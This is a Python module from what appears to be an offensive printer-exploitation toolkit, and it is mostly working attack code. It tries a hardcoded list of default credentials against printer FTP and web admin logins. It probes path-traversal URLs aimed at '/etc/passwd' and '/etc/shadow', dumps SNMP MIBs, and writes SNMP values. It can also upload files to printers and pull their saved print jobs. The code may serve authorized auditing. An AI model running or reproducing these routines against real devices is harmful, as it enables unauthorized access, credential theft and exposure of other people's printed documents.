#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrinterXPL-Forge — Printer Storage / Filesystem Module
=====================================================
Read, list, download and upload files from printer internal storage via:

  A. FTP (port 21) — some enterprise printers expose FTP for config/log files
  B. Web file manager — many printers expose /WEB/FOLDER or similar endpoints
  C. SNMP MIB data extraction — full MIB walk including saved job metadata
  D. SMB shares — extend existing SMB module for listing/downloading
  E. HTTP path traversal — common web admin vulnerabilities

Operations:
  list_files()    — list accessible files/directories
  download_file() — pull a file to local disk
  upload_file()   — push a file to the printer
  delete_file()   — delete a file from the printer
  dump_mib()      — full SNMP MIB dump to file
  get_saved_jobs()— retrieve saved/queued print jobs
"""

# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike

from __future__ import annotations

import ftplib
import io
import logging
import os
import re
import socket
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings()

_log = logging.getLogger(__name__)


# ── Common printer web paths ──────────────────────────────────────────────────

WEB_FILE_PATHS = [
    # EPSON
    '/PRESENTATION/', '/PRESENTATION/HTML/', '/LANGUAGES/',
    '/WSD/', '/EPSONLBP/', '/PRESENTATION/AIRPRINT/',
    # HP
    '/hp/device/info', '/hp/device/InternalPages/Index', '/DevMgmt/',
    '/webapps/hp/printjobs', '/webapps/hp/folder',
    # Generic CUPS
    '/admin/', '/admin/conf/', '/admin/log/',
    '/var/log/', '/var/spool/cups/',
    # Kyocera
    '/startkm.htm', '/Eng/Setting/AdminSetting.htm',
    # Xerox
    '/properties/webApps/config.htm',
    '/properties/Protocol/FTPClient.htm',
    # Ricoh
    '/web/guest/en/websys/webArch/getInfo.cgi',
    '/web/guest/en/websys/webArch/setting.cgi',
    # Common log/config pages
    '/cgi-bin/config.exp', '/cgi-bin/printer.cgi',
    '/setup.html', '/config.html', '/admin.html',
    '/info.htm', '/status.htm', '/system.cgi',
    # Path traversal candidates
    '/../etc/passwd', '/../etc/shadow', '/../etc/hosts',
    '/../proc/version', '/../var/log/syslog',
    '/../../../../etc/passwd',
]

SENSITIVE_EXTENSIONS = {'.dat', '.cfg', '.conf', '.log', '.bak',
                         '.key', '.pem', '.crt', '.pfx', '.p12',
                         '.bin', '.hex', '.rom', '.fw', '.img'}

KNOWN_DEFAULT_CREDS = [
    ('',       ''),           # blank/blank
    ('admin',  ''),           # admin / blank
    ('admin',  'admin'),
    ('admin',  'password'),
    ('admin',  '1234'),
    ('admin',  '12345'),
    ('admin',  '123456'),
    ('guest',  ''),
    ('guest',  'guest'),
    ('root',   ''),
    ('root',   'root'),
    ('root',   'password'),
    ('user',   'user'),
    ('epson',  ''),           # EPSON default
    ('epson',  'epson'),
    ('Brother',''),           # Brother default
    ('brother','access'),
    ('1234',   ''),           # common printer PIN
    ('admin',  'admin1234'),
    ('Admin',  'Admin'),
    ('service','service'),
    ('tech',   'tech'),
]


# ── A. FTP file operations ────────────────────────────────────────────────────

def _ftp_default_port() -> int:
    try:
        from utils.ports import PortConfig
        return PortConfig.resolve('ftp')
    except Exception:
        return 21


def ftp_list(
    host: str, port: int = 0, timeout: float = 8,
    username: str = 'anonymous', password: str = 'pentest@example.com',
) -> Dict:
    """
    List FTP directory contents on a printer.

    Many printers expose FTP with anonymous access or weak credentials.
    Returns dict with files, dirs, writable, and credentials used.
    """
    port = port or _ftp_default_port()
    result = {
        'host': host, 'port': port,
        'accessible': False, 'writable': False,
        'credentials': None, 'files': [], 'dirs': [], 'error': '',
    }

    cred_list = [(username, password)] + [
        (u, p) for u, p in KNOWN_DEFAULT_CREDS
        if (u, p) != (username, password)
    ]

    ftp = None
    for user, passwd in cred_list[:8]:  # limit attempts
        try:
            ftp = ftplib.FTP(timeout=timeout)
            ftp.connect(host, port, timeout)
            ftp.login(user, passwd)
            result['accessible']  = True
            result['credentials'] = (user, passwd)
            _log.info("FTP login OK: %s/%s @ %s:%d", user, passwd, host, port)
            break
        except ftplib.error_perm:
            ftp = None
            continue
        except Exception as exc:
            result['error'] = str(exc)[:60]
            return result

    if not ftp:
        result['error'] = 'FTP authentication failed for all credentials tried'
        return result

    try:
        lines = []
        ftp.retrlines('LIST -la', lines.append)
        for line in lines:
            parts = line.split()
            if not parts:
                continue
            name = parts[-1] if len(parts) >= 9 else line
            if line.startswith('d'):
                result['dirs'].append(name)
            else:
                result['files'].append({'name': name, 'raw': line[:80]})

        # Test write access
        try:
            ftp.stou()
            result['writable'] = True
        except Exception:
            pass

    except Exception as exc:
        result['error'] += str(exc)[:60]
    finally:
        try:
            ftp.quit()
        except Exception:
            pass

    return result


def ftp_download(
    host:      str,
    remote:    str,
    local_dir: str  = '.',
    port:      int  = 0,
    timeout:   float= 10,
    username:  str  = 'anonymous',
    password:  str  = 'pentest@example.com',
) -> Optional[bytes]:
    """
    Download *remote* file from printer FTP.

    Returns raw bytes or None on failure.
    """
    port = port or _ftp_default_port()
    try:
        ftp = ftplib.FTP(timeout=timeout)
        ftp.connect(host, port, timeout)
        ftp.login(username, password)
        buf = io.BytesIO()
        ftp.retrbinary(f'RETR {remote}', buf.write)
        ftp.quit()
        data = buf.getvalue()
        if local_dir:
            dest = Path(local_dir) / Path(remote).name
            dest.write_bytes(data)
            _log.info("FTP downloaded %s → %s (%d bytes)", remote, dest, len(data))
        return data
    except Exception as exc:
        _log.debug("FTP download %s failed: %s", remote, exc)
        return None


def ftp_upload(
    host:      str,
    local:     str,
    remote:    str,
    port:      int  = 0,
    timeout:   float= 10,
    username:  str  = 'anonymous',
    password:  str  = 'pentest@example.com',
) -> bool:
    """Upload *local* file to printer via FTP. Returns True on success."""
    port = port or _ftp_default_port()
    try:
        ftp = ftplib.FTP(timeout=timeout)
        ftp.connect(host, port, timeout)
        ftp.login(username, password)
        with open(local, 'rb') as fh:
            ftp.storbinary(f'STOR {remote}', fh)
        ftp.quit()
        return True
    except Exception as exc:
        _log.debug("FTP upload %s failed: %s", local, exc)
        return False


# ── B. Web file / page enumeration ────────────────────────────────────────────

def web_enumerate(
    host:    str,
    timeout: float = 8,
    verbose: bool  = True,
) -> Dict:
    """
    Enumerate accessible web pages/files on a printer's HTTP interface.

    Probes known paths including admin pages, config files, log files,
    and attempts path traversal to reach system files.

    Returns dict with accessible paths, interesting content, and credentials.
    """
    result = {
        'host':        host,
        'accessible':  [],
        'credentials': None,
        'traversal':   [],
        'sensitive':   [],
    }

    # Try HTTP and HTTPS
    for scheme in ('http', 'https'):
        port = 443 if scheme == 'https' else 80
        for path in WEB_FILE_PATHS:
            try:
                r = requests.get(
                    f'{scheme}://{host}:{port}{path}',
                    timeout=timeout, verify=False,
                    allow_redirects=True,
                )
                if r.status_code in (200, 206):
                    content_type = r.headers.get('Content-Type', '')
                    size         = len(r.content)
                    is_sensitive = any(ext in path.lower() for ext in SENSITIVE_EXTENSIONS)
                    is_traversal = '..' in path

                    entry = {
                        'url':          f'{scheme}://{host}:{port}{path}',
                        'status':       r.status_code,
                        'content_type': content_type[:50],
                        'size':         size,
                        'snippet':      r.text[:200].replace('\n', ' '),
                    }
                    result['accessible'].append(entry)

                    if is_traversal and size > 10:
                        result['traversal'].append(entry)
                        if verbose:
                            print(f"  [WEB] \033[1;31m[TRAVERSAL]\033[0m {path} "
                                  f"({size} bytes)")
                            print(f"        {r.text[:100]}")

                    elif is_sensitive:
                        result['sensitive'].append(entry)
                        if verbose:
                            print(f"  [WEB] \033[1;33m[SENSITIVE]\033[0m {path} "
                                  f"({size} bytes, {content_type})")

                    elif verbose and path not in ('/PRESENTATION/',):
                        print(f"  [WEB] {r.status_code} {path} ({size}b)")

            except Exception:
                pass

    # Attempt admin login with default credentials
    for scheme in ('http', 'https'):
        port = 443 if scheme == 'https' else 80
        for user, passwd in KNOWN_DEFAULT_CREDS[:12]:
            for admin_path in ('/admin', '/admin/', '/admin.htm', '/system.cgi',
                               '/setup', '/hp/device/info'):
                try:
                    r = requests.get(
                        f'{scheme}://{host}:{port}{admin_path}',
                        auth=(user, passwd),
                        timeout=timeout, verify=False,
                    )
                    if r.status_code == 200 and 'login' not in r.text[:200].lower():
                        result['credentials'] = (user, passwd, admin_path)
                        if verbose:
                            print(f"  [WEB] \033[1;31m[CREDS]\033[0m "
                                  f"Default credentials work: {user}/{passwd!r} "
                                  f"→ {admin_path}")
                        break
                except Exception:
                    pass
            if result['credentials']:
                break

    return result


# ── C. SNMP MIB full dump ──────────────────────────────────────────────────────

def snmp_dump(
    host:      str,
    community: str   = 'public',
    timeout:   float = 5,
    output_file: Optional[str] = None,
    verbose:   bool  = True,
) -> Dict[str, str]:
    """
    Perform a full SNMP MIB walk on the printer.

    Extracts:
      - System information (sysDescr, sysName, sysUpTime, sysContact)
      - Device info (hrDevice, hrStorage)
      - Printer-specific (prtMIB: toner levels, drum info, job count)
      - Interface table (MAC addresses, IP info)
      - Saved job metadata (if available)

    Returns dict {OID: value}. Also writes to *output_file* if specified.
    """
    result: Dict[str, str] = {}

    try:
        from pysnmp.hlapi import (
            nextCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity, SnmpEngine,
        )
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)
    except ImportError:
        _log.error("pysnmp not installed — SNMP dump unavailable")
        return result

    from utils.ports import PortConfig as _PC
    engine    = SnmpEngine()
    community_obj = CommunityData(community, mpModel=1)   # v2c
    transport = UdpTransportTarget(
        (host, _PC.resolve('snmp')), timeout=timeout, retries=1,
    )
    context   = ContextData()

    if verbose:
        print(f"  [SNMP] Walking MIB on {host} (community={community!r}) ...")

    start_oid = ObjectIdentity('1.3.6.1')  # all of MIB-2 and enterprise

    count = 0
    for err_ind, err_stat, err_idx, var_binds in nextCmd(
        engine, community_obj, transport, context,
        ObjectType(start_oid),
        lexicographicMode=False,
        maxRows=2000,
    ):
        if err_ind:
            _log.debug("SNMP walk error: %s", err_ind)
            break
        if err_stat:
            break
        for oid, val in var_binds:
            oid_str = str(oid)
            val_str = str(val)
            result[oid_str] = val_str
            count += 1

    if verbose:
        print(f"  [SNMP] Retrieved {count} OID values")

    if output_file and result:
        out = Path(output_file)
        out.parent.mkdir(parents=True, exist_ok=True)
        with open(out, 'w', encoding='utf-8') as fh:
            for oid, val in sorted(result.items()):
                fh.write(f"{oid} = {val}\n")
        if verbose:
            print(f"  [SNMP] Dump saved to {output_file} ({count} entries)")

    return result


def snmp_write(
    host:      str,
    oid:       str,
    value:     str,
    community: str   = 'private',
    timeout:   float = 5,
) -> bool:
    """
    Attempt to write a value via SNMP SET (requires 'private' or writable community).

    Common writable OIDs:
      1.3.6.1.2.1.1.5.0 — sysName (device hostname)
      1.3.6.1.2.1.1.6.0 — sysLocation
      1.3.6.1.2.1.1.4.0 — sysContact
      1.3.6.1.4.1.11.2.3.9.1.1.6.0 — HP: job-info-name1 (printed name)
    """
    try:
        from pysnmp.hlapi import (
            setCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity,
            OctetString, SnmpEngine,
        )
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)

        from utils.ports import PortConfig as _PC
        engine = SnmpEngine()
        for err_ind, err_stat, _, var_binds in setCmd(
            engine,
            CommunityData(community, mpModel=1),
            UdpTransportTarget((host, _PC.resolve('snmp')), timeout=timeout, retries=0),
            ContextData(),
            ObjectType(ObjectIdentity(oid), OctetString(value)),
        ):
            if not err_ind and not err_stat:
                return True
    except Exception as exc:
        _log.debug("SNMP SET %s=%r failed: %s", oid, value, exc)
    return False


# ── D. Saved print jobs retrieval ─────────────────────────────────────────────

def get_saved_jobs(
    host:    str,
    timeout: float = 10,
    verbose: bool  = True,
) -> List[Dict]:
    """
    Attempt to retrieve saved/stored print jobs from the printer.

    Methods tried:
      1. IPP Get-Jobs with 'completed' and 'all' — metadata only
      2. Web interface job list pages
      3. FTP /jobs or /spool directories (if FTP is open)

    Returns list of job dicts with available metadata.
    """
    jobs = []

    # Method 1: IPP
    try:
        from protocols.ipp_attacks import list_jobs, discover_endpoints
        eps = discover_endpoints(host, timeout)
        if eps:
            ep = eps[0]
            ipp_jobs = list_jobs(
                host, ep['port'], ep['path'], ep['scheme'],
                which='completed', timeout=timeout,
            )
            jobs.extend(ipp_jobs)
            if verbose and ipp_jobs:
                print(f"  [STORAGE] IPP completed jobs: {len(ipp_jobs)}")
    except Exception as exc:
        _log.debug("IPP job listing: %s", exc)

    # Method 2: Web job pages
    job_paths = [
        '/hp/device/jobs', '/webapps/hp/printjobs',
        '/PRESENTATION/HTML/TOP/JOBLIST.HTML',
        '/jobs', '/spool', '/queue',
    ]
    for scheme in ('http', 'https'):
        port = 443 if scheme == 'https' else 80
        for path in job_paths:
            try:
                r = requests.get(
                    f'{scheme}://{host}:{port}{path}',
                    timeout=timeout, verify=False,
                )
                if r.status_code == 200 and len(r.text) > 100:
                    job_names = re.findall(r'(?:job|file|document)\s*[:\-]\s*([^\<\n\r]{5,60})',
                                           r.text, re.I)
                    for name in job_names[:10]:
                        jobs.append({'source': 'web', 'name': name.strip()[:80],
                                     'url': f'{scheme}://{host}:{port}{path}'})
                    if verbose and job_names:
                        print(f"  [STORAGE] Web job list at {path}: "
                              f"{len(job_names)} entries")
            except Exception:
                pass

    return jobs


# ── E. Full storage audit ──────────────────────────────────────────────────────

def storage_audit(
    host:    str,
    timeout: float = 10,
    outdir:  str   = '.log',
    verbose: bool  = True,
) -> Dict:
    """
    Run a comprehensive printer storage audit.

    Attempts all available storage access methods and consolidates findings.
    """
    result = {
        'host':       host,
        'ftp':        None,
        'web':        None,
        'snmp_oids':  0,
        'saved_jobs': [],
        'risk':       [],
    }

    if verbose:
        print(f"\n  [STORAGE] Audit: {host}")

    # FTP
    ftp = ftp_list(host, timeout=timeout)
    result['ftp'] = ftp
    if ftp['accessible']:
        result['risk'].append(f'FTP_ACCESSIBLE ({ftp["credentials"][0]})')
        if verbose:
            print(f"  [STORAGE] \033[1;31m[VULN]\033[0m FTP open — "
                  f"creds={ftp['credentials']}, "
                  f"files={len(ftp['files'])}, "
                  f"writable={ftp['writable']}")

    # Web enumeration
    web = web_enumerate(host, timeout=timeout, verbose=verbose)
    result['web'] = web
    if web['traversal']:
        result['risk'].append(f'PATH_TRAVERSAL ({len(web["traversal"])} paths)')
    if web['credentials']:
        result['risk'].append(f'WEB_DEFAULT_CREDS ({web["credentials"][0]}/{web["credentials"][1]})')
    if web['sensitive']:
        result['risk'].append(f'SENSITIVE_FILES ({len(web["sensitive"])})')

    # SNMP MIB dump
    mib_file = os.path.join(outdir, f'snmp_dump_{host.replace(".", "_")}.txt')
    mib = snmp_dump(host, output_file=mib_file, verbose=verbose)
    result['snmp_oids'] = len(mib)
    if mib:
        result['risk'].append(f'SNMP_MIB_DUMPED ({len(mib)} OIDs)')

    # Saved jobs
    jobs = get_saved_jobs(host, timeout=timeout, verbose=verbose)
    result['saved_jobs'] = jobs
    if jobs:
        result['risk'].append(f'SAVED_JOBS ({len(jobs)})')

    return result
